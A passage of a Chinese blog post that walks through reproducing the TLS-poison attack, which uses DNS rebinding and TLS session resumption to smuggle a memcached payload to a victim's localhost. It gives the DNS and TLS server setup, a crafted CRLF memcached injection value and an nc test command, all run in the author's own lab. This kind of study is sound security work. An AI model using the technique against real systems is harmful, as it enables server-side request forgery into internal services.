iwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://raw.githubusercontent.com/jmdx/TLS-poison/master/diagram.svg" alt></p><p>&#x8FD9;&#x91CC;&#x518D;&#x5BF9;&#x56FE;&#x4E2D;&#x8FDB;&#x884C;&#x4E00;&#x4E9B;&#x89E3;&#x91CA;&#xFF1A;</p><ol><li>&#x653B;&#x51FB;&#x8005;&#x901A;&#x8FC7;&#x4E00;&#x4E9B;&#x65B9;&#x5F0F;&#x8BA9;&#x53D7;&#x5BB3;&#x8005;&#x6253;&#x5F00;&#x4E00;&#x4E2A; HTML &#x9875;&#x9762;&#xFF0C;&#x5176;&#x4E2D;&#x5185;&#x5BB9;&#x4F1A;&#x5411;&#x653B;&#x51FB;&#x8005;&#x51C6;&#x5907;&#x7684; TLS Server <a href="https://ssltest.jmaddux.com:11211" target="_blank" rel="noopener">https://ssltest.jmaddux.com:11211</a> &#x53D1;&#x8D77;&#x8BF7;&#x6C42;</li><li>&#x5F53;&#x53D7;&#x5BB3;&#x8005;&#x6253;&#x5F00;&#x8FD9;&#x4E2A;&#x9875;&#x9762;&#x540E;&#xFF0C;&#x53D7;&#x5BB3;&#x8005;&#x5BA2;&#x6237;&#x7AEF;&#x4F1A;&#x67E5;&#x8BE2; ssltest.jmaddux.com &#x7684; DNS &#x8BB0;&#x5F55;&#xFF0C;&#x6700;&#x7EC8;&#x4F1A;&#x5728;&#x653B;&#x51FB;&#x8005;&#x51C6;&#x5907;&#x7684; DNS &#x670D;&#x52A1;&#x5668;&#x67E5;&#x8BE2;&#x5230;&#x653B;&#x51FB;&#x8005;&#x63D0;&#x4F9B;&#x7684;&#x89E3;&#x6790;&#x8BB0;&#x5F55;</li><li>&#x6B64;&#x65F6; DNS &#x670D;&#x52A1;&#x5668;&#x6B63;&#x5E38;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x4E3A; TLS Server &#x5730;&#x5740;&#x5E76;&#x4E14; TTL &#x4E3A; 0 &#x7684;&#x54CD;&#x5E94;</li><li>&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001; Client Hello &#x6D88;&#x606F;</li><li>&#x670D;&#x52A1;&#x7AEF;&#x8FD4;&#x56DE; Server Hello &#x6D88;&#x606F;&#xFF0C;&#x5E76;&#x5728;&#x54CD;&#x5E94;&#x5305;&#x4E2D;&#x8BBE;&#x7F6E; session_id &#x4E3A; payload</li><li>&#x8FDB;&#x884C;&#x540E;&#x7EED;&#x7684;TLS&#x63E1;&#x624B;</li><li>&#x63E1;&#x624B;&#x5B8C;&#x6210;&#x540E;&#x8FDB;&#x884C; http &#x901A;&#x4FE1;&#x65F6;&#xFF0C;&#x653B;&#x51FB;&#x8005; TLS Server &#x8FD4;&#x56DE; 301 &#x8DF3;&#x8F6C;&#x5230; <a href="https://ssltest.jmaddux.com:11211" target="_blank" rel="noopener">https://ssltest.jmaddux.com:11211</a></li><li>&#x53D7;&#x5BB3;&#x8005;&#x5BA2;&#x6237;&#x7AEF;&#x91CD;&#x65B0;&#x52A0;&#x8F7D; <a href="https://ssltest.jmaddux.com:11211" target="_blank" rel="noopener">https://ssltest.jmaddux.com:11211</a></li><li>&#x7406;&#x8BBA;&#x4E0A;&#x7531;&#x4E8E;&#x4E4B;&#x524D; DNS &#x54CD;&#x5E94;&#x7684;&#x62A5;&#x6587;&#x7ED3;&#x679C;&#x4E2D; TTL &#x4E3A; 0 &#xFF0C;&#x53D7;&#x5BB3;&#x8005;&#x5BA2;&#x6237;&#x7AEF;&#x4F1A;&#x518D;&#x6B21;&#x5411; DNS &#x670D;&#x52A1;&#x5668;&#x8BE2;&#x95EE; ssltest.jmaddux.com &#x7684;&#x89E3;&#x6790;&#x7ED3;&#x679C;</li><li>&#x6B64;&#x65F6;&#x653B;&#x51FB;&#x8005;&#x8BA9; DNS &#x670D;&#x52A1;&#x5668;&#x8FD4;&#x56DE;&#x89E3;&#x6790;&#x7ED3;&#x679C;&#x4E3A; 127.0.0.1 &#x4E14; TTL &#x4E3A; 0</li><li>&#x63A5;&#x7740;&#x7531;&#x4E8E; TLS &#x4F1A;&#x8BDD;&#x91CD;&#x7528;&#xFF0C;&#x53D7;&#x5BB3;&#x8005;&#x5BA2;&#x6237;&#x7AEF;&#x4F1A;&#x4F7F;&#x7528;&#x4E4B;&#x524D;&#x7684; session_id &#x4E5F;&#x5C31;&#x662F; payload &#xFF0C;&#x5E26;&#x7740;&#x8FD9;&#x4E2A; payload &#x4E0E; 127.0.0.1:11211 &#x8FDB;&#x884C; TLS &#x4F1A;&#x8BDD;&#x91CD;&#x7528;&#x5C1D;&#x8BD5;</li><li>payload &#x88AB;&#x53D1;&#x9001;&#x81F3; 127.0.0.1:11211 &#xFF0C;&#x8FBE;&#x5230;&#x653B;&#x51FB;&#x8005;&#x76EE;&#x7684;&#xFF0C;&#x4F46;&#x662F;&#x56E0;&#x4E3A;&#x4F1A;&#x8BDD;&#x91CD;&#x7528;&#x5931;&#x8D25;&#xFF0C;&#x53D7;&#x5BB3;&#x8005;&#x5BA2;&#x6237;&#x7AEF;&#x4F1A;&#x5F97;&#x5230;&#x4E00;&#x4E2A; TLS Error &#x7684;&#x9519;&#x8BEF;&#x3002;&#x81F3;&#x6B64;&#x5B8C;&#x6210;&#x6240;&#x6709;&#x653B;&#x51FB;&#x6B65;&#x9AA4;&#x3002;</li></ol><h3 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h3><p>&#x597D;&#x4E86;&#xFF0C;&#x63A5;&#x4E0B;&#x6765;&#x5C31;&#x8BA9;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x52A8;&#x624B;&#x8BD5;&#x4E00;&#x8BD5;&#x5427;&#xFF01;&#x7531;&#x4E8E;&#x6211;&#x662F;&#x4F7F;&#x7528;&#x7684;&#x662F;&#x4E24;&#x4E2A; VPS &#xFF0C;&#x6CA1;&#x6709;&#x50CF;&#x539F;&#x4F5C;&#x8005;&#x4E00;&#x6837;&#x4F7F;&#x7528; docker &#xFF0C;&#x6240;&#x4EE5;&#x4F7F;&#x7528; docker &#x7684;&#x540C;&#x5B66;&#x8FD8;&#x8BF7;&#x81EA;&#x884C;&#x6478;&#x7D22;&#x3002;&#x5E76;&#x4E14;&#x7531;&#x4E8E;&#x56FD;&#x5185;&#x590D;&#x6742;&#x7684;&#x7F51;&#x7EDC;&#x73AF;&#x5883;&#xFF0C;&#x4E3A;&#x4E86;&#x907F;&#x514D;&#x4E0D;&#x5FC5;&#x8981;&#x7684;&#x9EBB;&#x70E6;&#xFF0C;&#x6211;&#x4F7F;&#x7528;&#x7684;&#x662F;&#x4E24;&#x53F0;&#x56FD;&#x5916;&#x7684; VPS &#x4F5C;&#x4E3A;&#x5B66;&#x4E60;&#x4F7F;&#x7528;&#x3002;</p><p>&#x6211;&#x51C6;&#x5907;&#x7684;&#x662F;&#x4E00;&#x4E2A;&#x57DF;&#x540D;&#x3001;&#x4E24;&#x53F0; VPS &#xFF0C;&#x5176;&#x4E2D;&#x4E00;&#x53F0; VPS &#x4F5C;&#x4E3A; DNS &#x670D;&#x52A1;&#x5668;&#xFF0C;&#x53E6;&#x5916;&#x4E00;&#x53F0;&#x4F5C;&#x4E3A; TLS &#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4E24;&#x53F0; VPS &#x5747;&#x662F; ubuntu 20.04 LTS &#x3002;&#x4F5C;&#x8005;&#x4ED3;&#x5E93;&#x5BF9;&#x4E8E;&#x5404;&#x81EA; VPS &#x7684;&#x51C6;&#x5907;&#x5DE5;&#x4F5C;&#x5DF2;&#x7ECF;&#x4ECB;&#x7ECD;&#x5F97;&#x6BD4;&#x8F83;&#x5168;&#x9762;&#x4E86;&#xFF0C;&#x8BE6;&#x7EC6;&#x53EF;&#x4EE5;&#x53C2;&#x9605;&#xFF1A;<a href="https://github.com/jmdx/TLS-poison/#instructions" target="_blank" rel="noopener">https://github.com/jmdx/TLS-poison/#instructions</a> &#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4E0D;&#x518D;&#x8D58;&#x8FF0;&#x4E86;&#x3002;</p><p>&#x552F;&#x4E00;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x8BF4;&#x4E00;&#x4E0B;&#x7684;&#x5C31;&#x662F;&#x8BC1;&#x4E66;&#x7533;&#x8BF7;&#xFF0C;&#x8FD9;&#x90E8;&#x5206;&#x4F5C;&#x8005;&#x6CA1;&#x6709;&#x63D0;&#x5230;&#xFF0C;&#x4E3A;&#x4E86;&#x907F;&#x514D;&#x4E00;&#x4E9B;&#x540C;&#x5B66;&#x4E0D;&#x6E05;&#x695A;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x4E00;&#x4E0B;&#xFF0C;&#x77E5;&#x9053;&#x4E86;&#x7684;&#x540C;&#x5B66;&#x5C31;&#x53EF;&#x4EE5;&#x8DF3;&#x8FC7;&#x4E86;&#x3002;&#x5728; TLS &#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x8BC1;&#x4E66;&#x51C6;&#x5907;&#x5DE5;&#x4F5C;&#xFF1A;</p><ul><li>&#x6309;&#x7167; <a href="https://certbot.eff.org/instructions" target="_blank" rel="noopener">https://certbot.eff.org/instructions</a> &#x5B89;&#x88C5;&#x5BF9;&#x5E94;&#x7684; cerbot </li><li>&#x7136;&#x540E;&#x63A8;&#x8350;&#x4F7F;&#x7528; DNS changllenges &#x7684;&#x65B9;&#x5F0F;&#x5F04;&#x8BC1;&#x4E66;&#xFF0C;&#x5F53;&#x7136;&#x5176;&#x4ED6;&#x65B9;&#x5F0F;&#x4E5F;&#x53EF;&#x4EE5;&#x3002;<code>certbot --manual --preferred-challenges dns certonly</code></li><li>&#x6309;&#x7167;&#x81EA;&#x5DF1;&#x7684;&#x4FE1;&#x606F;&#x586B;&#x597D;&#x540E;&#xFF0C;&#x4F1A;&#x63D0;&#x793A;&#x9700;&#x8981;&#x5230;&#x4F60;&#x7684; DNS &#x57DF;&#x540D;&#x7BA1;&#x7406;&#x5546;&#x5904;&#x589E;&#x52A0;&#x4E00;&#x4E2A; TXT &#x8BB0;&#x5F55;&#xFF0C;&#x76F4;&#x63A5;&#x6DFB;&#x52A0;&#x4E0A;&#x53BB;&#x5C31;&#x597D;&#x4E86;</li></ul><p>&#x7136;&#x540E;&#x6700;&#x540E;&#x6211;&#x4EEC;&#x5728;&#x57DF;&#x540D;&#x7684; DNS &#x4E0A;&#x914D;&#x7F6E;&#x4E00;&#x4E0B;&#x5982;&#x4E0B;&#x7684;&#x57FA;&#x672C;&#x8BBE;&#x7F6E;&#xFF0C;&#x8FD9;&#x91CC;&#x4EE5;&#x57DF;&#x540D;&#x4E3A; example.com &#x4E3E;&#x4F8B;&#xFF1A;</p><table><thead><tr><th>Type</th><th>Name</th><th>Value</th></tr></thead><tbody><tr><td>A</td><td>dns</td><td>(Your DNS VPS IP)</td></tr><tr><td>NS</td><td>tls</td><td>dns.example.com</td></tr><tr><td>TXT</td><td>_acme-challenge</td><td>(&#x8FD9;&#x91CC;&#x662F; cerbot &#x9A8C;&#x8BC1;&#x7528;&#x7684;&#x5B57;&#x7B26;&#x4E32;)</td></tr></tbody></table><p>&#x7136;&#x540E;&#x5C31;&#x5148;&#x5728; DNS VPS &#x4E0A;&#x8FD0;&#x884C;&#x4F5C;&#x8005;&#x7684; alternate-dns.py</p><p></p><figure class="highlight css hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-selector-tag">sudo</span> <span class="hljs-selector-tag">python3</span> <span class="hljs-selector-tag">alternate-dns</span><span class="hljs-selector-class">.py</span> <span class="hljs-selector-tag">tls</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span>,127<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span> <span class="hljs-selector-tag">-b</span> 0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span> <span class="hljs-selector-tag">-t</span> <span class="hljs-selector-tag">Your_TLS_IP</span> <span class="hljs-selector-tag">-d</span> 8<span class="hljs-selector-class">.8</span><span class="hljs-selector-class">.8</span><span class="hljs-selector-class">.8</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x73B0;&#x5728;&#x5C31;&#x4E07;&#x4E8B;&#x4FF1;&#x5907;&#x5566;&#xFF01;</p><p>Let&#x2019;s Try!</p><h3 id="Original-Method"><a href="#Original-Method" class="headerlink" title="Original Method"></a>Original Method</h3><p>&#x63A5;&#x4E0B;&#x6765;&#x6211;&#x4EEC;&#x5728; TLS VPS &#x8FDB;&#x884C;&#x4E00;&#x4E0B;&#x64CD;&#x4F5C;&#xFF0C;&#x9996;&#x5148;&#x7531;&#x4E8E;&#x4F5C;&#x8005;&#x539F;&#x6765;&#x662F;&#x4F7F;&#x7528;&#x7684;&#x662F; docker &#xFF0C;&#x6240;&#x4EE5;&#x6709;&#x4E9B;&#x914D;&#x7F6E;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x66F4;&#x6539;&#x4E00;&#x4E0B;&#xFF1A;</p><ul><li>&#x5728; client-hello-poisoning/custom-tls/src/main.rs#642 &#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x9700;&#x8981;&#x628A;<code>redis://redis/</code>&#x66F4;&#x6539;&#x4E3A;&#x81EA;&#x5DF1; TLS &#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684; redis &#x5730;&#x5740;&#xFF0C;&#x6BD4;&#x5982;&#x9ED8;&#x8BA4;&#x7684;&#x662F; 127.0.0.1:6379 &#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x5C31;&#x6539;&#x6210;<code>redis://127.0.0.1:6379/</code></li><li>&#x5728;&#x539F;&#x4F5C;&#x8005;&#x7684;&#x65B9;&#x6CD5;&#x4E2D;&#xFF0C; payload &#x7684;&#x8BBE;&#x7F6E;&#x9700;&#x8981;&#x5728; redis &#x5F53;&#x4E2D;&#x8BBE;&#x7F6E;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728; redis &#x8BBE;&#x7F6E;&#x597D; payload &#xFF0C;&#x5982;&#xFF1A;<code>set payload &quot;\r\nset foo 0 0 12\r\ntls session \r\n&quot;</code><ul><li>&#x5176;&#x4E2D; payload &#x662F; redis &#x5F53;&#x4E2D;&#x7684; key &#xFF0C;value &#x662F;&#x771F;&#x6B63;&#x53D1;&#x9001;&#x7ED9; memcached &#x7684;&#x5185;&#x5BB9;</li><li>Memcached &#x9700;&#x8981;&#x4EE5; CRLF &#x4F5C;&#x4E3A;&#x6574;&#x4E2A;&#x547D;&#x4EE4;&#x7684;&#x7ED3;&#x675F;&#xFF0C;&#x5E76;&#x4E14;&#x53EF;&#x4EE5;&#x5FFD;&#x7565;&#x4E4B;&#x524D;&#x7684;&#x8BED;&#x53E5;&#x9519;&#x8BEF;&#xFF0C;&#x800C;&#x539F;&#x4F5C;&#x8005;&#x7684;&#x6587;&#x6863;&#x4E2D;&#x7ED9;&#x51FA;&#x7684; payload &#x662F;&#x4EE5; \r &#x7ED3;&#x675F;&#xFF0C;&#x4F1A;&#x5BFC;&#x81F4;&#x5199;&#x4E0D;&#x8FDB; memcached &#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x4E00;&#x4E0B;&#xFF0C;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>&quot;\r\nset foo 0 0 13\ni in ur cache\r\n&quot;</code>&#x4F5C;&#x4E3A; payload &#x3002;<ul><li>&#x8FD9;&#x91CC;&#x5982;&#x679C;&#x8981;&#x4FEE;&#x6539;&#x7684;&#x8BDD;&#x8BB0;&#x5F97;&#x6539; set &#x547D;&#x4EE4;&#x7684;&#x7B2C;&#x4E09;&#x4E2A;&#x6570;&#x5B57;&#x53C2;&#x6570;&#xFF0C;&#x8BE5;&#x53C2;&#x6570;&#x4E3A;&#x8BBE;&#x7F6E;&#x6570;&#x636E;&#x7684;&#x957F;&#x5EA6;&#xFF0C;&#x5426;&#x5219;&#x4E5F;&#x4F1A;&#x53D1;&#x751F;&#x9519;&#x8BEF;&#x5199;&#x4E0D;&#x8FDB; memcahed&#xFF0C;&#x6BD4;&#x5982;<code>i in ur cache</code>&#x8FD9;&#x91CC;&#x662F; 13 &#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x524D;&#x9762;&#x7684;&#x7B2C;&#x4E09;&#x4E2A;&#x6570;&#x5B57;&#x53C2;&#x6570;&#x5C31;&#x9700;&#x8981;&#x4E3A; 13 &#xFF1B;&#x524D;&#x9762;&#x7684;&#x547D;&#x4EE4;&#x4E0E;&#x6570;&#x636E;&#x95F4;&#x7684;&#x6362;&#x884C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; LF &#x4F5C;&#x4E3A;&#x6362;&#x884C;&#xFF0C;&#x53EF;&#x4EE5;&#x8282;&#x7701;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#x957F;&#x5EA6;&#x3002;</li><li>&#x8FD9;&#x91CC;&#x5EFA;&#x8BAE;&#x5148;&#x4F7F;&#x7528;<code>echo -e &quot;\r\nset foo 0 0 13\ni in ur cache\r\n&quot;|nc 127.0.0.1 11211</code>&#x6765;&#x5C1D;&#x8BD5;&#x81EA;&#x5DF1;&#x7684; pyaload &#x662F;&#x5426;&#x80FD;&#x591F;&#x5199;&#x5165; memcached &#xFF0C;&#x8FD9;&#x6837;&#x5982;&#x679C;&#x540E;&#x9762;&#x5931;&#x8D25;&#x4E86;&#xFF0C;&#x5BF9;&#x540E;&#x9762;&#x7684;&#x6392;&#x9519;&#x5F88;&#x6709;&#x7528;&#xFF01;&#x81F3;&#x5C11;&#x80FD;&#x6392;&#x9664;&#x4E00;&#x4E2A;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x7684;&#x95EE;&#x9898;&#xFF01;</li></ul></li></ul></li><li>&#x5728;&#x539F;&#x4F5C;&#x8005;&#x7684;&#x65B9;&#x6CD5;&#x4E2D;&#xFF0C;&#x4E3A;&#x4E86;&#x8BA9; TLS &#x8FDB;&#x884C; Session Resumption &#xFF0C;&#x4F5C;&#x8005;&#x4F7F;&#x7528;&#x4E86; HTTP 301 &#x8DF3;&#x8F6C;&#x7684;&#x65B9;&#x5F0F;&#x8BA9; TLS &#x8FDB;&#x884C;&#x6062;&#x590D;&#x4F1A;&#x8BDD;&#xFF0C;&#x800C;&#x8DF3;&#x8F6C;&#x7684;&#x5730;&#x5740;&#x5219;&#x4E5F;&#x9700;&#x8981;&#x6211;&#x4EEC;&#x901A;&#x8FC7; redis &#x6765;&#x8BBE;&#x7F6E;&#xFF0C;&#x8BBE;&#x7F6E;&#x7684; key &#x4E3A; redirect &#xFF0C;&#x4EE5; example.com &#x4E3E;&#x4F8B;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8FD9;&#x6837;&#x8FDB;&#x884C;&#x8BBE;&#x7F6E;&#xFF1A;<code>set redirect  &quot;https://tls.example.com:11211/&quot;</code> &#x3002;&#xFF08;&#x8FD9;&#x91CC;&#x662F;&#x539F;&#x4F5C;&#x8005;&#x6CA1;&#x6709;&#x5728;&#x6587;&#x6863;&#x4E2D;&#x505A;&#x51FA;&#x8BF4;&#x660E;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x5F97;&#x9700;&#x8981;&#x9605;&#x8BFB; main.rs &#x4EE3;&#x7801;&#x624D;&#x80FD;&#x770B;&#x51FA;&#x6765;&#xFF09;</li><li>&#x8FD8;&#x6709;&#x4E00;&#x70B9;&#x5C31;&#x662F;&#x4F5C;&#x8005;&#x8FD8;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x4E2A;&#x5EF6;&#x8FDF;&#x7684;&#x9009;&#x9879;&#xFF0C;&#x4EE5;&#x514D;&#x8BF7;&#x6C42;&#x8FC7;&#x5FEB;&#xFF08;&#x8FD9;&#x91CC;&#x6709;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x539F;&#x56E0;&#x5728;&#x6B64;&#x5904;&#xFF0C;&#x540E;&#x7EED;&#x6211;&#x4EEC;&#x4F1A;&#x5206;&#x6790;&#x5230;&#xFF09;&#x3002;&#x6211;&#x4EEC;&#x8FD8;&#x662F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; redis &#x6765;&#x8BBE;&#x7F6E; sleep &#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x53EF;&#x4EE5;&#x8FBE;&#x5230;&#x5EF6;&#x8FDF;&#x591A;&#x5C11; ms &#x7684;&#x6548;&#x679C;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x8BBE;&#x7F6E;&#x7684;&#x8BDD;&#xFF0C;&#x9ED8;&#x8BA4;&#x503C;&#x4E3A; 2000 ms &#xFF0C;&#x4E00;&#x822C;&#x8FD9;&#x4E2A;&#x6570;&#x503C;&#x5C31;&#x53EF;&#x4EE5;&#x4E86;&#x3002;</li></ul><p>&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x4EE5;&#x653B;&#x51FB;&#x672C;&#x5730;&#x7684; memcached &#x4E3A;&#x4F8B;&#xFF0C;&#x5728; ubuntu 20.04 LTS &#x4E0A;&#x9ED8;&#x8BA4;&#x4F7F;&#x7528;<code>apt install memcached</code>&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#x4E4B;&#x540E;&#xFF0C;&#x5176;&#x9ED8;&#x8BA4;&#x76D1;&#x542C;&#x5728; 11211 &#x7AEF;&#x53E3;&#x4E0A;&#x3002;&#x4E4B;&#x540E;&#x6211;&#x4EEC;&#x6309;&#x7167;&#x4F5C;&#x8005;&#x7684;&#x8BF4;&#x660E;&#xFF0C;&#x5728; TLS VPS &#x4E0A;&#x8FD0;&#x884C; TLSServer &#xFF1A;</p><p></p><figure class="highlight jboss-cli hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target/debug/custom-tls -p 11211 <span class="hljs-params">--verbose</span> <span class="hljs-params">--certs</span> <span class="hljs-string">/path/to/fullchain.pem</span> <span class="hljs-params">--key</span> <span class="hljs-string">/path/to/privkey.pem</span> http</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x597D;&#x4E86;&#xFF0C;&#x73B0;&#x5728;&#x624D;&#x7EC8;&#x4E8E;&#x662F;&#x4E00;&#x5207;&#x51C6;&#x5907;&#x5C31;&#x7EEA;&#x4E86;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4F7F;&#x7528; curl &#x8FDB;&#x884C;&#x6D4B;&#x8BD5;&#x4E86;&#x3002;&#x8FD9;&#x91CC;&#x4E3A;&#x4E86;&#x76F4;&#x89C2;&#x67E5;&#x770B; TLS Session Resumption &#x7684;&#x6548;&#x679C;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6253;&#x5F00;&#x4E24;&#x4E2A; wireshark &#x6765;&#x89C2;&#x5BDF;&#xFF0C;&#x4E00;&#x4E2A; wireshark &#x76D1;&#x542C;&#x5728;&#x4F60;&#x5BF9;&#x5916;&#x901A;&#x4FE1;&#x7684;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x4E0A;&#xFF0C;&#x4E00;&#x4E2A; wireshark &#x76D1;&#x542C;&#x5728;&#x672C;&#x5730;&#x56DE;&#x73AF;&#x63A5;&#x53E3;&#x4E0A;&#x3002;&#x8FD0;&#x884C;&#x4E00;&#x4E0B;&#x547D;&#x4EE4;&#x8BBF;&#x95EE;&#x4F60;&#x7684; TLSServer &#xFF1A;</p><p></p><figure class="highlight groovy hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="hljs-string">https:</span><span class="hljs-comment">//tls.example.com:11211/ -Lv</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>PS: &#x6CE8;&#x610F;&#x8FD9;&#x91CC;&#x9700;&#x8981;&#x52A0;&#x4E0A;<code>-L</code>&#x53C2;&#x6570;&#x5141;&#x8BB8; curl &#x8FDB;&#x884C;&#x91CD;&#x5B9A;&#x5411;&#x3002;</p><p>&#x63A5;&#x7740;&#x5982;&#x679C;&#x7B2C;&#x4E00;&#x6B21; DNS &#x5C31;&#x628A;&#x6211;&#x4EEC;&#x7684;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5230; 127.0.0.1&#x7684;&#x8BDD;&#xFF0C;&#x53EF;&#x4EE5;&#x591A;&#x8BD5;&#x51E0;&#x6B21;&#x76F4;&#x5230;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x5230;&#x4F60;&#x7684; TLS VPS IP &#x4E0A;&#x4E3A;&#x6B62;&#xFF0C;&#x7136;&#x540E;&#x7B49;&#x5F85; 1 min &#x5DE6;&#x53F3;&#xFF0C;&#x5982;&#x679C;&#x7F51;&#x7EDC;&#x987A;&#x7545;&#xFF0C;&#x4E00;&#x5207;&#x987A;&#x5229;&#x7684;&#x8BDD;&#xFF0C;&#x5728; 1min &#x5DE6;&#x53F3;&#x5C31;&#x53EF;&#x4EE5;&#x5B8C;&#x6210;&#x672C;&#x6B21;&#x653B;&#x51FB;&#x3002;&#x653B;&#x51FB;&#x6548;&#x679C;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwA